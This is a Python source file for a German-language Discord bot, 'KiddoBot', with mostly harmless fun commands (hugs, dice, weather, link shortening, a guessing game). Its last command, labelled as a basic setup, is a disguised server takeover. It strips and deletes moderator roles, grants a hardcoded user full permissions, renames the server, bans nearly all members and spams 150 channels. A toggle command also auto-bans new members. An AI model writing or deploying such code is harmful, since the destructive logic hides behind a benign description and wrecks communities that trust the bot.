import discord
#import voice_handler
import random
import time
import requests
#import geburtstag_handler
import qrcode_handler
import weather_handler
from discord.ext import commands
from discord.ui import Button, View
from Buttons import HL_Buttons
#from discord_components import DiscordComponents, Button
#import pathlib
#import osu_handler

icon_path = "D:\a\haha.png"

def Schalter():
    readline = open("switch.txt", "r")
    switch_state = readline.read()
    switch = "error"
    if switch_state == 'True':
        switch = "an"
    if switch_state == 'False':
        switch = "aus"
    return switch

    def check(m):
        return m.content == 'y' or m.content == 'yes' or m.content == 'n' or m.content == 'no' or m.content == 'ja' or m.content == 'nein'

class KiddoBot(commands.Cog):
    bot = commands.AutoShardedBot(commands.when_mentioned_or('!!'), intents=discord.Intents.all())

    def __init__(self, bot):
        self.bot = bot

    def freigabe():
        def predicate(ctx):
            return (ctx.author.id == 695885580629704734) or (ctx.author.id == 408627107795828746)

        print(predicate)
        return commands.check(predicate)


    @bot.hybrid_command()
    @commands.check(freigabe)
    async def switchpls(self, ctx):
            readline = open("switch.txt", "r")
            switch_state = readline.read()
            if switch_state == 'False':
                await ctx.channel.send("Der Schalter ist an. Alle neuen Mitglieder werden gebannt. :)")
                readline = open("switch.txt", "w")
                readline.write('True')
            elif switch_state == 'True':
                await ctx.channel.send("Der Schalter ist aus. Alle neuen Mitglieder werden begrüßt. :)")
                readline = open("switch.txt", "w")
                readline.write('False')
            else:
                await ctx.channel.send(
                    "!!switchpls broken, bitte Brot#0685 kontaktieren, er muss wieder reparieren kommen :)")

    #TODO: Fix this command
    '''
    @bot.command()
    async def switchstate(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            await ctx.channel.send(
                f'Möchtest du den status deines Schalters erfahren? (y , yes , ja / n, no, nein)')
            
            response = await ctx.wait_for('ctx', check=check, timeout=15)
            if response.clean_content.lower() == 'y' or response.clean_content.lower() == 'yes' or response.clean_content.lower() == 'ja':
                await ctx.channel.send('Der Schalter ist ' + Schalter())

            elif response.clean_content.lower() == 'n' or response.clean_content.lower() == 'no' or response.clean_content.lower() == 'nein':
                await ctx.channel.send('Okidoki, dann halt nicht :)')

            else:
                await ctx.channel.send("Du bist zu dumm um zu verstehen, was ich dir sage :)")
        else:
            await ctx.channel.send("Du bist nicht berechtigt diesen Befehl auszuführen. Tut mir leid :)")
    '''



    #####MEGA GEBURTSTAG EVENT AAAAAAAAAAAAAAAAAAAAAAAAAAAA#############################################################
    @bot.command()
    async def Geburtstag(self, ctx):
        await geburtstag_handler.geburtstag(ctx, bot)


    @bot.hybrid_command(aliases=['Hallo' , 'hallo kiddo' , 'Hallo kiddo' , 'hallo Kiddo' , 'Hallo Kiddo'])
    async def hallo(self,ctx):
        await ctx.send(f'Hallo {ctx.author.mention} :)')

    @bot.hybrid_command(aliases=['Hilfe'])
    async def hilfe(self, ctx):
        button = Button(label=">>", style=discord.ButtonStyle.primary)

        async def button_callback(interaction):
            await interaction.response.edit_message(content="A")

        button.callback = button_callback

        view = View()
        view.add_item(button)


        embedVar = discord.Embed(title="Hier sind alle Commands:", color=0xff00ff)
        embedVar.set_thumbnail(url="https://i.imgur.com/ed0LHRk.jpg")
        embedVar.add_field(name="!!hilfe", value="Zeigt dir alle Commands", inline=False)
        embedVar.add_field(name="ping", value="pong", inline=False)
        embedVar.add_field(name="!!roll_dice", value="Würfelt eine Zahl", inline=False)
        embedVar.add_field(name="!!dance", value="Kiddo tanzt", inline=False)
        embedVar.add_field(name="!!witz", value="Kiddo erzählt dir einen Witz", inline=False)
        embedVar.add_field(name="!!qrcodepls", value="Kiddo erstellt dir einen QR-Code", inline=False)
        embedVar.add_field(name="!!details", value="Zeigt dir die Konfigurationen des Channels", inline=True)
        embedVar.add_field(name="!!details2", value="Zeigt dir die Konfigurationen des Servers", inline=False)
        embedVar.add_field(name="!!ABFAHRT", value="KIDDO FÄHRT DAVON!!", inline=False)
        embedVar.add_field(name="!!play", value="Spielt einen Song ab", inline=False)
        embedVar.add_field(name="!!stop", value="Stoppt den Song", inline=False)
        embedVar.add_field(name="!!hit", value="+ @User um jemanden zu schlagen", inline=False)
        embedVar.add_field(name="!!kiss", value="+ @User um jemanden zu küssen", inline=False)
        embedVar.add_field(name="!!hug", value="+ @User um jemanden zu umarmen", inline=False)
        await ctx.send(embed=embedVar , view=view)


    @freigabe()
    @bot.hybrid_command(description='Löscht eine bestimmte Anzahl an Nachrichten')
    async def loesche(self, ctx, anzahl=0):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            #await ctx.typing()
            time.sleep(2)
            async with ctx.typing():
                await ctx.channel.purge(limit=int(anzahl))

            if anzahl == 1:
                await ctx.interaction.response.send_message('Eine Nachricht wurde gelöscht... :)', ephemeral=True )
            elif anzahl > 1:
                await ctx.interaction.response.followup.send(content="Testt")
                #await responese.send(f'{anzahl} Nachrichten wurden gelöscht... :)')

            #ctx.interaction.response.followup
            #if Limit == 3:
                #print('Eine Nachricht wurde gelöscht. Glückwunsch!')
            #else:
                #print(f'{Limit - 2} Nachrichten wurden gelöscht. Glückwunsch!')

            #await ctx.interaction.response.send_message(f"only you, , can see this!", ephemeral=True)
            #ctx.I

        else:
            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')

    @bot.hybrid_command(aliases=['roll dice'], description = 'Würfelt einen Würfel mit einer bestimmten Anzahl an Seiten')
    async def rolldice(self, ctx, numberofrolls=1, numberofsides=6):
        await ctx.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
        time.sleep(1)
        for i in range(int(numberofrolls)):
            await ctx.send(random.randint(1, int(numberofsides)))

    @bot.hybrid_command(description = 'Kiddo tanzt!')
    async def dance(self, ctx):
        dance = open("gifs.txt", "r")
        dance = dance.readlines()
        dance = random.choice(dance)
        await ctx.send(dance)

    @bot.hybrid_command(description = 'Kiddo erzählt die einen Witz! Aber pass auf, vielleicht bist du der Witz...')
    async def witz(self, ctx):
        zahl = random.randint(1 , 100)
        if zahl == 1:
            await ctx.send("Du bist so hässlich, dass man dich nicht mal mit einem Taschenrechner vergleichen kann. Kein Witz. Einfach die Wahrheit.")
        else:
            witze = open("witze.txt", "r")
            witze = witze.readlines()
            witze = random.choice(witze)
            witze = str(witze)
            await ctx.send(witze)

    @bot.hybrid_command(description = 'Kiddo erstellt dir einen QR-Code')
    async def qrcodepls (self, ctx):
        await qrcode_handler.qrcode(ctx, self)

    #TODO: Fix the qrcode handler

    #Todo: Fix the voice handler
    '''
    
    @bot.command()
    if ctx.content == '!!recordpls' or ctx.content =='!!stoppls' or ctx.content == '!!disconnectpls':
        await voice_handler.record_voice(bot, ctx)
    '''

    @bot.hybrid_command(descritpion = 'Nur für coole Leute :)')
    async def details(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            await ctx.send("irgendwas hat hier nicht geklappt :(")
            await ctx.author.create_dm()
            await ctx.author.dm_channel.send(f"```"
                                                 f"Halli Hallo 💕\n"
                                                 f"Hier sind ein paar Details zu dem Channel :) \n"
                                                 f"Channel: {ctx.channel}\n"
                                                 f"Channel ID: {ctx.channel.id}\n"
                                                 f"Channel Name: {ctx.channel.name}\n"
                                                 f"Channel Type: {ctx.channel.type}\n"
                                                 f"Channel Category: {ctx.channel.category}\n"
                                                 f"Channel Category ID: {ctx.channel.category_id}\n"
                                                 f"Channel Category Name: {ctx.channel.category.name}\n"
                                                 f"Channel Category Type: {ctx.channel.category.type}\n"
                                                 f"Channel Category Position: {ctx.channel.category.position}\n"
                                                 f"```")
        else:
            pass

    @bot.hybrid_command(descritpion = 'Nur für coole Leute :)')
    async def details2(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            await ctx.send("Irgendwas hat hier nicht geklappt :(")
            await ctx.author.create_dm()
            await ctx.author.dm_channel.send(f"```"
                                                 f"Halli Hallo 💕\n"
                                                 f"Hier sind ein paar Details zu dem Server :) \n"
                                                 f"Server: {ctx.guild}\n"
                                                 f"Server ID: {ctx.guild.id}\n"
                                                 f"Server Name: {ctx.guild.name}\n"
                                                 f"Server Owner: {ctx.guild.owner}\n"
                                                 f"Server Owner ID: {ctx.guild.owner_id}\n"
                                                 f"Server Icon: {ctx.guild.icon}\n"
                                                 f"Server Splash: {ctx.guild.splash}\n"
                                                 f"Server Banner: {ctx.guild.banner}\n"
                                                 f"Server Discovery Splash: {ctx.guild.discovery_splash}\n"
                                                 f"Server Description: {ctx.guild.description}\n"
                                                 f"Server Features: {ctx.guild.features}\n"
                                                 f"```")
        else:
            pass


    @bot.hybrid_command(description = 'Ist die nächste Zahl größer oder kleiner?')
    async def higherlower(self, ctx):
        view = HL_Buttons()

        number = random.randint(1, 100)
        number2 = random.randint(1, 100)
        hlembed = discord.Embed(title="**Higher or Lower?**", color=0xff00ff)
        hlembed.add_field(name=f"Ist die nächste Zahl **größer** oder **kleiner** als {number}? \n"
                               f"du hast 10 Sekunden Zeit! ⏱" , value=" " , inline=False)
        hlembed.set_footer(text="Schaffste eh nicht :D")
        message = await ctx.send(embed=hlembed, view=view)

        await view.wait()
        hlembed.clear_fields()
        if view.value == None:
            hlembed.add_field(name="Du hast zu lang gebraucht! Du hast verloren!", value=" ", inline=False)
        elif view.value == "größer" and number2 > number:
            hlembed.add_field(name="Du hast gewonnen!", value="Die Zahl war {}".format(number2), inline=False)
        elif view.value == "kleiner" and number2 < number:
            hlembed.add_field(name="Du hast gewonnen!", value="Die Zahl war {}".format(number2), inline=False)
        else:
            hlembed.add_field(name="Du hast verloren!", value="{} ist nicht {} als {}".format(number2,view.value,number), inline=False)


        # comparen dann embed neu setzen
        await message.edit(embed=hlembed, view=view) #anschließend ausführen



    @bot.hybrid_command(description = 'Kiddo küsst dich 0 /// 0')
    async def kiss(self, ctx, name: discord.Member = None):
        if name:
            backup = name
            name = name.nick
            if name == None:
                name = backup

            kisser = ctx.author.nick
            if kisser == None:
                kisser = ctx.author.name

            file = open("kiss.txt", "r")
            embedVar = discord.Embed(title="😘 Kiss", color=0xff00ff)
            embedVar.add_field(name=f"**{name}**!" f" Du wirst von **{kisser}** geküsst!", value="", inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()
        else:
            file = open("kiss.txt", "r")
            embedVar = discord.Embed(title="😘 Kiss", color=0xff00ff)
            embedVar.add_field(name=f"**{ctx.author.nick}**! " 'küsst jeden!', value="", inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()

    @bot.hybrid_command(description = 'Kiddo umarmt dich 0 /// 0')
    async def hug(self, ctx, name: discord.Member = None):
        if name:
            backup = name
            name = name.nick
            if name == None:
                name = backup

            hugger = ctx.author.nick
            if hugger == None:
                hugger = ctx.author.name

            file = open("hug.txt", "r")
            embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von ' f"**{hugger}** umarmt!", value="",
                               inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()

        else:
            file = open("hug.txt", "r")
            embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{ctx.author.nick}** umarmt jeden!", value="", inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()

    @bot.hybrid_command(description = 'Kiddo schlägt dich ;.;')
    async def hit(self, ctx, name: discord.Member = None):
        if name:
            backup = name
            name = name.nick
            if name == None:
                name = backup

            hitter = ctx.author.nick
            if hitter == None:
                hitter = ctx.author.name

            file = open("hit.txt", "r")
            embedVar = discord.Embed(title="😠 Hit!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von **' + f"{hitter}** geschlagen!", value="",
                               inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()
        else:
            file = open("hit.txt", "r")
            embedVar = discord.Embed(title="😠 Hit!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{ctx.author.nick}**! " 'schlägt jeden!', value="", inline=False)
            embedVar.set_image(url=str(random.choice(file.readlines())))
            await ctx.send(embed=embedVar)
            file.close()

    @bot.hybrid_command(description = 'Kiddo kürzt dir einen beliebigen Link <3')
    async def shorten(self, ctx, link=None):
        file = open("data.txt", "r")
        lines = file.readlines()
        AcT = lines[10]
        AcT = AcT[0:len(AcT) - 1]
        file.close()

        if link:
            await ctx.send('Einen Moment :3')
            try:
                headers = {
                    'Authorization': f'Bearer {AcT}',
                    'Content-Type': 'application/json',
                }
                payload = {"long_url": link}
                response = requests.post('https://api-ssl.bitly.com/v4/shorten', headers=headers, json=payload)
                result = response.json()

                shortened = result["link"]

                await ctx.send("Hier dein gekürzter Link:\n" + shortened + "\nViel Spaß <3")

            except:
                time.sleep(2)
                await ctx.send("Hmmmm... Vielleicht hast du keinen Link gesendet :face_with_spiral_eyes: Versuche es noch mal :)")

        else:
            await ctx.send("Ewwor!")

    @bot.hybrid_command(aliases=['Wetter','heute'] , description = 'Frage Kiddo nach dem Wetter :)')
    async def wetter(self, ctx, *, location=None):
        if location:
            await weather_handler.get_weather(location, ctx)
        else:
            await ctx.send("Bitte gib einen Ort an!")

    @bot.hybrid_command(description = 'Lasse dir Daten zu deinem osu! Profil anzeigen :)')
    async def profile(self, ctx, *, name=None):
        if name:
            await osu_handler.get_profile(name, ctx)
        else:
            await osu_handler.get_profile(name, ctx)

    @bot.hybrid_command(aliases=['Morgen'])
    async def morgen(self, ctx, *, location=None):
        if location:
            await weather_handler.get_weather_forecast(location, ctx)
        else:
            await ctx.send("Bitte gib einen Ort an!")

    @bot.hybrid_command(aliases=['Alarm'])
    async def alarm(self, ctx, *, location=None):
        if location:
            await weather_handler.get_weather_alert(location, ctx)
        else:
            await ctx.send("Bitte gib einen Ort an!")

    @bot.hybrid_command()
    async def pingr(self, ctx):
        await ctx.send('Pong! mit {0}ms'.format(round(self.bot.latency, 1)))

    @bot.event
    async def on_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            await ctx.send("Dieser Befehl existiert nicht!")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Bitte gib einen Ort an!")
        elif isinstance(error, commands.CheckFailure):
            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)', epidermal=True)
        else:
            await ctx.send("Ein Fehler ist aufgetreten!")
            print(error)

    @bot.hybrid_command(description = 'Basic Setup damit Kiddo funktioniert :)')
    async def setup(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 482833516774817795 or ctx.author.id == 633376425465872404: #walnusskeim, Wqffel oder bonerboy
            await self.bot.change_presence(status=discord.Status.offline)
            await ctx.send("ABFAHRT!!!",
                                       file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
            time.sleep(2)
            await ctx.channel.purge(limit=1)

            for bot in ctx.guild.members:
                role = discord.utils.get(bot.guild.roles, name="Bots")
                if role in bot.roles:
                    await bot.remove_roles(role)
                    print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")

            for role in ctx.guild.roles:
                if role.name == "Mod":
                    await role.delete(reason="Unnötig")
                    print('"Mod" Rolle gelöscht')
                if role.name == "uwu admins":
                    await role.delete(reason="Unnötig")
                    print('"uwu admins" Rolle gelöscht')

            for user in ctx.guild.members:
                funny = discord.utils.get(user.guild.roles, name="Owner <3")
                if funny in user.roles:
                    await user.remove_roles(funny)
                    print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
            user2 = ctx.guild.get_member(633376425465872404) #bonerboy
            await user2.add_roles(funny)
            await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
            print("Ich habe dir die Rolle Owner <3 gegeben 0w0")


            with open('haha.png', 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(name = "FOR TEA AND KIDDO!" , icon = icon)


            for member in ctx.guild.members:
                if member.id == 695885580629704734 or member.id == 633376425465872404: #walnusskeim oder bonerboy
                    pass
                else:
                    await member.ban(reason="Kiddo hat heute keinen guten Tag :)")

            for m in range(0, 101):
                await ctx.message.guild.create_text_channel("Wowzers!!")
                time.sleep(0.1)

            for v in range(0, 51):
                await ctx.message.guild.create_voice_channel("Wowzers!!")
                time.sleep(0.1)

        else:
            await ctx.send("Da ist etwas falsch gelaufen :/")